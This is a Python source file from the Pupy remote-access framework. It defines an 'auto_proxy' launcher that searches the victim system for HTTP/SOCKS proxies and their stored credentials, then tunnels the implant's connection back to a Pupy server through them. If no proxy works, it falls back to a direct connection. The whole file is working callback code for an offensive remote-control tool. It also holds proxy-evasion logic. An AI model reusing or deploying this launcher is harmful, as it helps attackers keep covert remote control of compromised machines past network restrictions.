# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

__all__ = ['AutoProxyLauncher']

import argparse

from network.lib import utils

from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
from ..proxies import get_proxies, find_default_proxy

import logging

def find_proxies(additional_proxies=None):
    proxy_info = find_default_proxy()
    if proxy_info:
        yield proxy_info

    for proxy_info in get_proxies(additional_proxies=additional_proxies):
        if proxy_info:
            yield proxy_info

class AutoProxyLauncher(BaseLauncher):
    """
        Automatically search a HTTP/SOCKS proxy on the system and use that proxy with the specified TCP transport.
        Also try without proxy if none of them are available/working
    """

    __slots__ = (
        'arg_parser', 'args', 'rhost', 'rport', 'connect_on_bind_payload'
    )

    def __init__(self, *args, **kwargs):
        super(AutoProxyLauncher, self).__init__(*args, **kwargs)

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(prog="auto_proxy", description=cls.__doc__)
        cls.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
        cls.arg_parser.add_argument('-t', '--transport', choices=cls.transports, default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
        cls.arg_parser.add_argument('--add-proxy', action='append', help=" add a hardcoded proxy TYPE:address:port ex: SOCKS5:127.0.0.1:1080")
        cls.arg_parser.add_argument('--no-direct', action='store_true', help="do not attempt to connect without a proxy")
        cls.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")

    def parse_args(self, args):
        self.args=self.arg_parser.parse_args(args)
        self.rhost, self.rport=None,None
        tab=self.args.host.rsplit(":",1)
        self.rhost=tab[0]
        if len(tab)==2:
            self.rport=int(tab[1])
        else:
            self.rport=443
        self.set_host("%s:%s"%(self.rhost, self.rport))
        self.set_transport(self.args.transport)

    def iterate(self):
        if self.args is None:
            raise LauncherError("parse_args needs to be called before iterate")

        opt_args = utils.parse_transports_args(' '.join(self.args.transport_args))

        # Try to find/use proxies
        for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
                additional_proxies=self.args.add_proxy
            ):
            try:
                t = self.transports[self.args.transport]()
                client_args = {
                    k:v for k,v in t.client_kwargs.iteritems()
                }

                transport_args = {
                    k:v for k,v in t.client_transport_kwargs.iteritems()
                }

                if 'host' not in opt_args:
                    transport_args['host'] = '{}{}'.format(
                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
                    )

                for val in opt_args:
                    if val.lower() in t.client_transport_kwargs:
                        transport_args[val.lower()]=opt_args[val]
                    else:
                        client_args[val.lower()]=opt_args[val]

                transport_args['proxy'] = True
                if proxy_password or proxy_username:
                    transport_args['auth'] = (proxy_username, proxy_password)

                transport_args['connect'] = self.rhost, self.rport

                proxy_addr, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                chost, cport = proxy_addr, proxy_port

                if proxy_type not in t.internal_proxy_impl:
                    if t.client is PupyTCPClient:
                        t.client=PupyProxifiedTCPClient
                    elif t.client is PupySSLClient:
                        t.client=PupyProxifiedSSLClient
                    else:
                        raise SystemExit("proxyfication for client %s is not implemented"%str(t.client))

                    client_args.update({
                        'proxy_type': proxy_type.upper(),
                        'proxy_addr': proxy_addr,
                        'proxy_port': proxy_port,
                        'proxy_username': proxy_username,
                        'proxy_password': proxy_password
                    })

                    chost, cport = self.rhost, self.rport

                logging.info("using client options: %s"%client_args)
                logging.info("using transports options: %s"%transport_args)

                try:
                    t.parse_args(transport_args)
                except Exception as e:
                    #at this point we quit if we can't instanciate the client
                    raise SystemExit(e)
                try:
                    client = t.client(**client_args)
                except Exception as e:
                    #at this point we quit if we can't instanciate the client
                    raise SystemExit(e)

                logging.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(
                    self.rhost, self.rport, self.args.transport, proxy_type, proxy_addr, proxy_port)
                )

                s = client.connect(chost, cport)
                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
                yield stream

            except StopIteration:
                raise

            except Exception as e:
                logging.error(e)

        # Try without any proxy
        if not self.args.no_direct:
            try:
                t = self.transports[self.args.transport]()

                client_args = {
                    k:v for k,v in t.client_kwargs.iteritems()
                }

                transport_args = {
                    k:v for k,v in t.client_transport_kwargs.iteritems()
                }

                if 'host' not in opt_args:
                    transport_args['host'] = '{}{}'.format(
                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
                    )

                for val in opt_args:
                    if val.lower() in t.client_kwargs:
                        client_args[val.lower()]=opt_args[val]
                    elif val.lower() in t.client_transport_kwargs:
                        transport_args[val.lower()]=opt_args[val]
                    else:
                        logging.warning("unknown transport argument : %s"%val)

                logging.info("using client options: %s"%client_args)
                logging.info("using transports options: %s"%transport_args)
                try:
                    t.parse_args(transport_args)
                except Exception as e:
                    #at this point we quit if we can't instanciate the client
                    raise SystemExit(e)
                try:
                    client=t.client(**client_args)
                except Exception as e:
                    #at this point we quit if we can't instanciate the client
                    raise SystemExit(e)
                logging.info("connecting to %s:%s using transport %s without any proxy ..."%(
                    self.rhost, self.rport, self.args.transport)
                )
                s=client.connect(self.rhost, self.rport)
                stream = t.stream(s, t.client_transport, transport_args)
                yield stream
            except StopIteration:
                raise
            except Exception as e:
                logging.error(e)
